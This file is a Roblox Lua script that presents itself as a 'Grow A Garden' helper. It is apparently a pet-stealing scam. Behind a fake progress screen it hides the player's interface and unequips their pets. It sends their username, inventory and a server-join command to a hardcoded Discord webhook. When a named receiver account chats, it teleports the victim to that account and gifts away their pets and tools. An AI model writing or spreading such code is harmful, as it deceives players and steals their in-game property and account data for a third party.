local webhook = "https://discordapp.com/api/webhooks/1383929372393865256/PNJrS42uuz285r99a6r0aq27xvJoex54Kq_nmEYKNSJ8p13o0ESvPdFvZgyGi0gdJJEA"
local receiverName = "Heuehejsj_3"
local spamDelay = 0.5
local teleporting = false
local importantDetected = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
local PetGiftService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local PetsPhysical = workspace:FindFirstChild("PetsPhysical")

-- ‚ùå BLACKLIST MELHORADA - Itens que N√ÉO devem ser dados
local blacklist = {
    -- Plantas/Comidas
    ["Carrot"] = true,
    ["StrawBerry"] = true, 
    ["Blueberry"] = true,
    ["Orange Tulip"] = true,
    ["Tomato"] = true,
    ["Corn"] = true,
    ["Daffodil"] = true,
    ["Watermelon"] = true,
    ["Pumpking"] = true,
    ["Apple"] = true,
    ["Bamboo"] = true,
    ["Coconut"] = true,
    ["Cactus"] = true,
    ["Dragon Fruit"] = true,
    ["Mango"] = true,
    -- Ferramentas b√°sicas
    ["Shovel"] = true,
    ["Shovel [Destroy Plants]"] = true,
    ["Watering Can"] = true,
    ["Seeds"] = true,
    -- Adicione mais itens aqui conforme necess√°rio
}

-- ‚úÖ WHITELIST - Apenas itens que SABEMOS que podem ser dados
local giftableItems = {
    ["Pet"] = true,
    ["Rare Pet"] = true,
    ["Epic Pet"] = true,
    ["Legendary Pet"] = true,
    -- Adicione outros itens que podem ser dados
}

local importantPets = {
    ["Queen Bee"] = true,
    ["Red Fox"] = true,
    ["Dragon Fly"] = true,
    ["Raccoon"] = true
}

-- üßº Limpa UI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
for _, ui in ipairs(PlayerGui:GetDescendants()) do
    if ui:IsA("GuiObject") and ui.Name:lower():find("backpack") then
        pcall(function() ui:Destroy() end)
    end
end

-- üì∫ Tela de Loading
local screen = Instance.new("ScreenGui", PlayerGui)
screen.Name = "GrowGardenUI"
screen.IgnoreGuiInset = true
screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local frame = Instance.new("Frame", screen)
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

local title = Instance.new("TextLabel", frame)
title.Text = "üåø Grow A Garden Script - FIXED"
title.Font = Enum.Font.GothamBlack
title.TextSize = 48
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.1, 0)

local barBack = Instance.new("Frame", frame)
barBack.Size = UDim2.new(0.8, 0, 0.05, 0)
barBack.Position = UDim2.new(0.1, 0, 0.5, 0)
barBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)

local barFill = Instance.new("Frame", barBack)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 127)

local percent = Instance.new("TextLabel", barBack)
percent.Text = "0%"
percent.Font = Enum.Font.GothamSemibold
percent.TextSize = 28
percent.TextColor3 = Color3.new(1, 1, 1)
percent.BackgroundTransparency = 1
percent.Size = UDim2.new(1, 0, 1, 0)

-- üîé Verifica se player tem prompt de gift
local function getPlayerGiftPrompt(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return nil end
    
    for _, prompt in ipairs(targetPlayer.Character:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") and 
           (prompt.ActionText:lower():find("gift") or prompt.ActionText:lower():find("give")) then
            return prompt
        end
    end
    return nil
end

-- üìè Verifica dist√¢ncia entre players
local function getDistance(player1, player2)
    if not player1.Character or not player2.Character then return math.huge end
    local hrp1 = player1.Character:FindFirstChild("HumanoidRootPart")
    local hrp2 = player2.Character:FindFirstChild("HumanoidRootPart")
    if not hrp1 or not hrp2 then return math.huge end
    return (hrp1.Position - hrp2.Position).Magnitude
end

-- üöÄ TELEPORTE MELHORADO
local function teleportToPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    if not targetHRP or not myHRP then return false end
    
    -- Teleporta para perto do target (n√£o exatamente em cima)
    local offset = Vector3.new(math.random(-3, 3), 0, math.random(-3, 3))
    myHRP.CFrame = targetHRP.CFrame + offset
    
    task.wait(0.1) -- Pequena pausa para sincronizar
    return getDistance(LocalPlayer, targetPlayer) < 10
end

-- üåê Webhook
local function sendWebhook(petsRemoved, backpackList)
    local joinCmd = string.format(
        '```lua\n-- Copie e cole no console para entrar no servidor\n' ..
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")\n```',
        game.PlaceId,
        game.JobId
    )

    local embed = {
        title = "üåø Grow A Garden Hit - LIGHT SCRIPTS [FIXED]",
        color = tonumber("0x00ffcc"),
        fields = {
            {
                name = "üë§ Player Info",
                value = string.format("Name: `%s`\nReceiver: `%s`\nExecutor: `%s`\nAccount Age: `%s`",
                    LocalPlayer.Name, receiverName, identifyexecutor and identifyexecutor() or "Unknown", LocalPlayer.AccountAge),
                inline = false
            },
            {
                name = "üéí Backpack (Filtered)",
                value = #backpackList > 0 and table.concat(backpackList, "\n") or "`Empty`",
                inline = false
            },
            {
                name = "üêæ Pets Removed",
                value = #petsRemoved > 0 and table.concat(petsRemoved, "\n") or "`None`",
                inline = false
            },
            {
                name = "üü¢ Join with Command",
                value = joinCmd,
                inline = false
            }
        },
        footer = { text = "Light Scripts - Fixed Version" }
    }

    local payload = {
        content = importantDetected and "@here IMPORTANT PET DETECTED!" or nil,
        embeds = { embed }
    }

    local request = (syn and syn.request) or (http and http.request) or (http_request)
    if request then
        pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- üéí Lista backpack (APENAS itens n√£o-blacklisted)
local petsRemoved, backpackList = {}, {}
for _, tool in ipairs(Backpack:GetChildren()) do
    if tool:GetAttribute("d") then tool:SetAttribute("d", false) end
    
    -- S√≥ adiciona na lista se N√ÉO estiver na blacklist
    if not blacklist[tool.Name] then 
        table.insert(backpackList, tool.Name) 
    end
end

-- üêæ Remove pets do jardim
if PetsPhysical then
    for _, p in ipairs(PetsPhysical:GetChildren()) do
        if p:IsA("Part") and p:GetAttribute("OWNER") == LocalPlayer.Name then
            local uuid = p:GetAttribute("UUID")
            local petName = "Unknown"
            for _, m in ipairs(p:GetChildren()) do
                if m:IsA("Model") and m:GetAttribute("CurrentSkin") then
                    petName = m:GetAttribute("CurrentSkin")
                    break
                end
            end
            if importantPets[petName] then
                petName = "üîî **" .. petName .. "**"
                importantDetected = true
            end
            table.insert(petsRemoved, petName)
            PetsService:FireServer("UnequipPet", uuid)
        end
    end
end

sendWebhook(petsRemoved, backpackList)

-- üéØ SISTEMA DE GIFTING CORRIGIDO
local function startGifting()
    if teleporting then return end
    teleporting = true

    task.spawn(function()
        while teleporting do
            local target = Players:FindFirstChild(receiverName)
            if not target or not target.Character then 
                task.wait(2) 
                continue 
            end

            -- üöÄ Teleporte melhorado
            local teleported = teleportToPlayer(target)
            if not teleported then
                task.wait(1)
                continue
            end

            -- üêæ Gift pets usando RemoteEvent correto
            if PetsPhysical then
                for _, p in ipairs(PetsPhysical:GetChildren()) do
                    if p:IsA("Part") and p:GetAttribute("OWNER") == LocalPlayer.Name then
                        pcall(function()
                            PetGiftService:FireServer("GivePet", target)
                        end)
                        task.wait(spamDelay)
                    end
                end
            end

            -- üéí Gift tools (APENAS se tiver ProximityPrompt no target)
            local giftPrompt = getPlayerGiftPrompt(target)
            if giftPrompt then
                for _, tool in ipairs(Backpack:GetChildren()) do
                    -- VERIFICA: n√£o est√° na blacklist E √© uma tool
                    if not blacklist[tool.Name] and tool:IsA("Tool") then
                        if tool.Parent == Backpack then
                            -- Equipa a tool
                            LocalPlayer.Character.Humanoid:EquipTool(tool)
                            task.wait(0.5)
                            
                            -- Verifica se ainda tem o prompt (pode ter mudado)
                            local currentPrompt = getPlayerGiftPrompt(target)
                            if currentPrompt then
                                -- Tenta dar gift
                                pcall(function()
                                    fireproximityprompt(currentPrompt)
                                end)
                                task.wait(spamDelay)
                            else
                                -- Se n√£o tem prompt, desequipa
                                LocalPlayer.Character.Humanoid:UnequipTools()
                            end
                        end
                    end
                end
            end

            task.wait(2) -- Pausa entre ciclos
        end
    end)
end

-- üí¨ Ativar quando receiver falar no chat
for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == receiverName then
        p.Chatted:Connect(startGifting)
    end
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == receiverName then
        p.Chatted:Connect(startGifting)
    end
end)

-- üïí UI: barra de progresso
task.spawn(function()
    local duration = 300
    local start = tick()
    while true do
        local pct = math.clamp((tick() - start) / duration, 0, 1)
        barFill.Size = UDim2.new(pct, 0, 1, 0)
        percent.Text = string.format("%d%%", math.floor(pct * 100))
        if pct >= 1 then break end
        task.wait(0.1)
    end
    percent.Text = "‚úÖ 100% Done!"
end)
